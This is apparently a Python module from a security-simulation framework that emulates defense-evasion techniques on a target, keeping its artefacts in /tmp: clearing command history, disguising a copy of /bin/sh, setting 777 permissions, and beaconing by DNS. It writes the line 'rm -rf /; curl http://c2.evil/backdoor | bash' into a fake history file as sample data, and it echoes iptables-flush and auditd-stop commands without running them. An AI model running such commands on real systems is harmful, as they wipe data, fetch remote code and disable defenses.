# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: defense_evasion — Defense Evasion (TA0005)
T1070.003 Indicator Removal: Clear Command History
T1036     Masquerading
T1036.005 Masquerading: Match Legitimate Name or Location
T1222     File and Directory Permissions Modification
T1562.001 Impair Defenses: Disable or Modify Tools

SAFE simulation: clears history in /tmp context, copies /bin/sh to a fake
system name in /tmp, sets SUID-like permissions on the copy, writes fake
iptables flush to show evasion pattern. All artefacts in /tmp only.
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "evasion-sim.gloamfire.invalid"
_FAKE_BINARY = "/tmp/gloamfire_svchost_sim"
_HISTORY_FILE = "/tmp/gloamfire_fake_history"


@register
class DefenseEvasionAttack(BaseAttack):
    name = "defense_evasion"
    description = "Simulate defense evasion: history clearing, masquerading, permissions modification (T1070.003, T1036, T1222, T1562)"
    mitre = ["T1070.003", "T1036", "T1036.005", "T1222", "T1562.001"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        fake_bin = params.get("fake_binary", _FAKE_BINARY)
        hist_file = params.get("history_file", _HISTORY_FILE)
        resolver = params.get("resolver", "8.8.8.8")

        script = f"""
echo "[Gloamfire] Defense evasion simulation starting"

# T1070.003 — clear command history (bash history in /tmp, not real ~/.bash_history)
echo "rm -rf /; curl http://c2.evil/backdoor | bash" > {hist_file}
echo "[Gloamfire] Fake history written to {hist_file}"
cat /dev/null > {hist_file}
echo "[Gloamfire] History cleared (T1070.003)"

# T1036 / T1036.005 — masquerade: copy shell to a name resembling a system process
cp /bin/sh {fake_bin}
echo "[Gloamfire] Binary copied as '{fake_bin}' to masquerade as system process (T1036)"

# T1222 — modify permissions: set executable + world-writable on fake binary
chmod 777 {fake_bin}
echo "[Gloamfire] Permissions set to 777 on fake binary (T1222)"

# T1562.001 — impair defenses: show what disabling iptables looks like (simulated only)
echo "[Gloamfire] Simulating: iptables -F (flush all rules) — NOT actually run"
echo "[Gloamfire] Simulating: systemctl stop auditd — NOT actually run"
echo "[Gloamfire] Defense evasion simulation complete"
"""
        result = self._exec(target, script)
        result.metadata["fake_binary"] = fake_bin

        self._exec(target, f"nslookup {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true")
        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class DefenseEvasionCleanup(BaseAttack):
    name = "defense_evasion_cleanup"
    description = "Remove defense evasion simulation artefacts"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        fake_bin = params.get("fake_binary", _FAKE_BINARY)
        hist_file = params.get("history_file", _HISTORY_FILE)
        return self._exec(target, f"rm -f {fake_bin} {hist_file}")
